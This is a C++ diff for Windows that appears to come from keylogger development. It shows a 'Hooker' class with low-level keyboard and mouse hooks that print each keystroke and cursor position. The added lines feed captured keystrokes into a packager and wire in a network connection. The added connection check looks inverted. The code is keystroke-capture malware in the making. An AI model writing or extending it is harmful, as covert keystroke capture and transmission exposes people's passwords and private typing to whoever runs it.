@@ -47,12 +47,16 @@ void Hooker::deInitializeHooks()
 
 void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMouse)
 {
+	if (isConnected())
+		connect();
 	if (isMouse) {
 		MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
 		std::cout << "MOUSE INPUT " << nCode << "  " << wParam << "  " << mouseStruct->pt.x << "  " << mouseStruct->pt.y << std::endl;
+		//_packager.addKey(nCode, wParam, lParam);	// MOUSEINPUT
 	}
 	else {
 		std::cout << "KB INPUT " << nCode << "  " << wParam << "  " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
+		_packager.addKey(nCode, wParam, lParam);
 	}
 }
 
@@ -65,20 +69,24 @@ bool& Hooker::isConnected()
 	return _connected;
 }
 
-//Network& Hooker::getNetwork()
-//{return *_network;}
+Network& Hooker::getNetwork()
+{return *_network;}
+
+
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	Hooker& hooker = Hooker::getInstance();
 	if (nCode >= 0)
-		Hooker::getInstance().receiveCallback(nCode, wParam, lParam);
+		hooker.receiveCallback(nCode, wParam, lParam);
 	return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
 LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	Hooker& hooker = Hooker::getInstance();
 	if (nCode >= 0)
-		Hooker::getInstance().receiveCallback(nCode, wParam, lParam, true);
+		hooker.receiveCallback(nCode, wParam, lParam, true);
 	return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
